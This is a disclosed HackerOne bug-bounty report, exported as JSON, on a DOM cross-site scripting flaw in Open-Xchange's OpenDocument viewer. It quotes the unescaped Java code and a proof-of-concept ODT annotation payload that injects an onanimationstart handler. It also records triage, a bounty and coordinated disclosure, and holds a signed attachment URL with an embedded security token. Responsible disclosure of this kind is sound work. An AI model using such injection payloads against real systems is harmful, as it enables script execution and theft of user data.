{"id":894915,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ5MTU=","url":"https://hackerone.com/reports/894915","title":"XSS on opening a malicious OpenOffice text document","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-09T22:33:37.505Z","submitted_at":"2020-06-09T22:33:37.505Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skr0x1c0","url":"/skr0x1c0","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-23T11:35:40.531Z","bug_reporter_agreed_on_going_public_at":"2020-09-24T07:56:33.803Z","team_member_agreed_on_going_public_at":"2020-11-23T11:35:40.453Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Title\nOpening a malicious OpenOffice text document may lead to cross site scripting (XSS) attacks\n\n# Description\nWhen generating HTML content for a comment present in text file, a placeholder `div` is generated by [CommentPlaceHolder.java](https://gitlab.open-xchange.com/documents/office/-/blob/develop/com.openexchange.office.htmldoc/src/com/openexchange/office/htmldoc/CommentPlaceHolder.java#L79). The attribute `data-container-id` of this `div` is directly constructed from the field `id` without any HTML escaping as shown below.\n\n``` java\npublic class CommentPlaceHolder extends SubNode {\n    private static final String PLACEHOLDERSTART = \"\u003cdiv contenteditable=\\\"false\\\" class=\\\"inline commentplaceholder\\\" data-container-id=\\\"\";\n    private static final String PLACEHOLDERCLOSER = \"\\\"\";\n    private static final String PLACEHOLDEREND = \"\u003e\u003c/div\u003e\";\n\n    private String              id;\n\n    public CommentPlaceHolder(int position, String id) {\n        super(position, 1);\n        this.id = id;\n    }\n\n    @Override\n    public boolean appendContent(StringBuilder document) throws Exception {\n        document.append(PLACEHOLDERSTART + this.id + PLACEHOLDERCLOSER);\n\n        JSONObject params = new JSONObject();\n        params.put(\"containerId\", id);\n\n        document.append(\" jquerydata='\");\n        document.append(params.toString());\n        document.append(\"'\");\n        document.append(PLACEHOLDEREND);\n\n        return true;\n    }\n    ...\n}\n```\n\nFor an OpenDocument text file, the `id` field is constructed from attribute `office:name` of the element `office:annotation`. This attribute may contain \"double quotes\" which can be used for injecting arbitary HTML code into the generated HTML. A `odt` document with `content.xml` file of following format will execute `alert(document.domain)` javascript code when user opens the document.\n\n``` xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003coffice:document-content ...\u003e\n    ...\n    \u003coffice:body\u003e\n        \u003coffice:text\u003e\n            ...\n            \u003ctext:p text:style-name=\"Standard\"\u003e\n                \u003ctext:span\u003e\n                    \u003coffice:annotation\n                            office:name=\"cmt695a_0\u0026quot; style=\u0026quot;animation-name: fa-spin\u0026quot; onanimationstart=\u0026quot;alert(document.domain)\"\u003e\n                        \u003cdc:creator\u003eTest User\u003c/dc:creator\u003e\n                        \u003cdc:date\u003e2020-06-09T23:05:00Z\u003c/dc:date\u003e\n                        \u003ctext:p text:style-name=\"p829040448\"\u003e\n                            \u003ctext:span\u003eHello comment\u003c/text:span\u003e\n                        \u003c/text:p\u003e\n                    \u003c/office:annotation\u003e\n                    Hello World!\n                    \u003coffice:annotation-end office:name=\"cmt695a_0\"/\u003e\n                \u003c/text:span\u003e\n            \u003c/text:p\u003e\n        \u003c/office:text\u003e\n    \u003c/office:body\u003e\n\u003c/office:document-content\u003e\n```\n\nThe generated HTML for the comment placeholder is of following format\n``` xml\n\u003cdiv contenteditable=\"false\" class=\"inline commentplaceholder\" data-container-id=\"cmt695a_0\"\n     style=\"animation-name: fa-spin\" onanimationstart=\"alert(document.domain)\" jquerydata='...'\u003e\n\u003c/div\u003e\n```\n\n# Steps to reproduce\n1. Upload attached `payload_comment_placeholder.odt` to OX drive\n2. Open the `payload_comment_placeholder.odt` file. This will trigger an alert dialog with value `document.domain`\n\n## Impact\n\nThis XSS can execute arbitary javascript code without any user interaction when the user opens a maliciously crafted OpenOffice text document. This may be used for extracting and tampering user data (including encrypted documents) and executing other actions on user account like sending emails.","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861423,"file_name":"payload_comment_placeholder.odt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1MTSG5kh8sBdsugbPRaAXfGk?response-content-disposition=attachment%3B%20filename%3D%22payload_comment_placeholder.odt%22%3B%20filename%2A%3DUTF-8%27%27payload_comment_placeholder.odt\u0026response-content-type=application%2Fvnd.oasis.opendocument.text\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153928Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=32227780cee0c77a4ed7c9d6a77348d78fce8a70ee661aac981fe00b59d87ca7","file_size":13920,"type":"application/vnd.oasis.opendocument.text"}],"allow_singular_disclosure_at":null,"vote_count":18,"voters":["secator","bombon","ali","aporlorxl23","what_web","h4x0r_dz","t3chn0phil3","nims786","h1-qualys-scan","samuraisnotebook","and 8 more..."],"severity":{"rating":"medium","score":5.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8254154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, i'll have a look on this.","automated_response":false,"created_at":"2020-06-10T13:01:44.944Z","updated_at":"2020-06-10T13:01:44.944Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8254370,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-10T13:24:13.036Z","updated_at":"2020-06-10T13:24:13.036Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8254382,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-06-10T13:25:00.983Z","updated_at":"2020-06-10T13:25:00.983Z","additional_data":{"old_severity":"High (8.1)","new_severity":"Medium (5.4)","old_severity_id":745610,"new_severity_id":746306},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8271386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\n\nWe'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \"researcher credits\"?","automated_response":false,"created_at":"2020-06-12T09:48:42.070Z","updated_at":"2020-06-12T09:48:42.070Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8279273,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mheiland,\n\nYes, I would like to be included in the advisories. Please use following information for the same:\nSreejith Krishnan R(@skr0x1c0)","automated_response":false,"created_at":"2020-06-13T00:09:08.417Z","updated_at":"2020-06-13T00:09:08.417Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8303045,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-06-16T07:34:09.017Z","updated_at":"2020-06-16T07:34:09.017Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skr0x1c0","url":"/skr0x1c0"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8303047,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-06-16T07:34:29.484Z","updated_at":"2020-06-16T07:34:29.484Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"skr0x1c0","url":"/skr0x1c0"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8317220,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","automated_response":false,"created_at":"2020-06-17T10:04:59.284Z","updated_at":"2020-06-17T10:04:59.284Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9315775,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since this bug is fixed in 7.10.4, can we disclose this report?","automated_response":false,"created_at":"2020-09-24T07:56:33.837Z","updated_at":"2020-09-24T07:56:33.837Z","first_to_agree":true,"actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This bug was disclosed on security advisory published in 13th October 2020 (https://seclists.org/fulldisclosure/2020/Oct/20).\n\nCan we disclose this report also?","automated_response":false,"created_at":"2020-11-23T11:26:57.912Z","updated_at":"2020-11-23T11:26:57.912Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897246,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-23T11:35:40.474Z","updated_at":"2020-11-23T11:35:40.474Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9897247,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-23T11:35:40.557Z","updated_at":"2020-11-23T11:35:40.557Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}